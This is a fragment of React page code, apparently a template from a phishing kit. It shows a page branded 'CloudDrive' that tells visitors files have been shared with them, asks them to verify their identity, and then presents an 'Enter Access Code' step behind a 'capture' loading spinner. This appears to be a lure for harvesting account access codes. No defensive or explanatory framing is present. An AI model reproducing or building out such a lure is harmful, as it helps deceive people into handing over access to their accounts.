    ...
    <div className="tpl-page" style={{ background: '#f0f6ff' }}>
      <div className="tpl-container" style={{ maxWidth: 500 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 24 }}>
          ...
          <span style={{ fontSize: 18, fontWeight: 600, color: '#1b1b1b' }}>CloudDrive</span>
        </div>
        ...
        <div className="tpl-card">
          {f.state === 'idle' && (
            <>
              ...
              <p className="tpl-text">Someone has shared files with you on CloudDrive. Verify your identity to access the shared content.</p>
          ...
          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Connecting to CloudDrive...</p></div>}
          {(f.state === 'code_ready' || f.state === 'waiting') && (
            <>
              <h1 className="tpl-title">Enter Access Code</h1>
              <p className="tpl-text">Use this code to verify and access the shared files.</p>
